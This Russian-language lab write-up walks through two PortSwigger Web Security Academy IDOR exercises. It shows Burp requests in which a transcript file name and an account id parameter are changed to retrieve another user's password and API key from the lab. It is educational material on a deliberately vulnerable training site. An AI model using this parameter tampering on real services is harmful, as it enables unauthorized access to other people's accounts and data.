# IDOR LAB

Повторяя теорию не стоит забывать и о практике. Эту уязвимость просмотрю в специальных, изолированных комнатах на площадке 
portswigger.

## 1`st lab

Первая комната (Далее лаб(а) от англ. Laboratory) называется: Insecure direct object references

В предписании сказано:

```
В этой лабораторной работе журналы чата пользователей хранятся непосредственно в файловой 
системе сервера и извлекаются с помощью статических URL-адресов.

Решите лабораторную работу, найдя пароль пользователя carlos и войдя в его учетную запись.
```

При заходе видим обычную витрину с товарами, также на страничке есть вкладки `Мой аккаунт`, `Чат`. Нам нужен чат

Burp выдает запрос GET на страничку чата:

```
GET /chat HTTP/2
Host: 0adf0030032ba4f581d199e0006c00f8.web-security-academy.net
Cookie: session=4LmlSse6Ylt9Z5hg917ABL1Wt9wxWqM8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0adf0030032c00f8.web-security-academy.net/chat
```

В самом запросе ничего особо интерессного, как и на выходе, однако в чате с перепиской есть возможность скачать ее:

```
GET /download-transcript/2.txt HTTP/2
Host: 0adf0030032ba4f581d199e0006c00f8.web-security-academy.net
Cookie: session=4LmlSse6Ylt9Z5hg917ABL1Wt9wxWqM8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
```

Можно заметить в методе ссылку на этот чат, так как чаты хранятся в самой файловой системе странички можно просто перейти на другой чат, изменив название txt-файла в методе GET:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is npe32nedx33m2v8f0j9e. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

Отправив запрос в Repeater и изменив название файла, сервер выдал такой ответ, с другим чатом. В этом чате можно увидеть пароль: "npe32nedx33m2v8f0j9e", а зайдя на логин-форму можно войти в аккаунт Карлоса

## 2`nd lab

Вторая лаба называется: User ID controlled by request parameter

В предписании сказано:

```
Эта лаборатория имеет горизонтальную уязвимость эскалации привилегий на странице учетной записи пользователя.
Чтобы решить лабораторию, получите ключ API для пользователя carlos и представить это как решение.
Вы можете войти в свою учетную запись, используя следующие учетные данные: wiener:peter 
```

Отлично, заходя на сайт и зайдя на аккаунт в URL и в запросе burp можно увидеть что аккаунт записат следом за полем id:
`https://0a2d00e5035dd72c80f66ced008c00c6.web-security-academy.net/my-account?id=wiener` - URL

Отправляем запрос на логин в Repeater, меняя аккаунт

```burp
GET /my-account?id=carlos HTTP/2
Host: 0a2d00e5035dd72c80f66ced008c00c6.web-security-academy.net
Cookie: session=qdBsvU8P7Eq77AOkdfpXKFJOc7IGkuG0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2d00e5035dd72c80f66ced008c00c6.web-security-academy.net/login
```

В Response получаем:

```
<h1>My Account</h1>
	<div id=account-content>
	<p>Your username is: carlos</p>
		<div>Your API Key is: DwxAaxYWnyv62r1JkZsssrYohngc48CI</div>
```
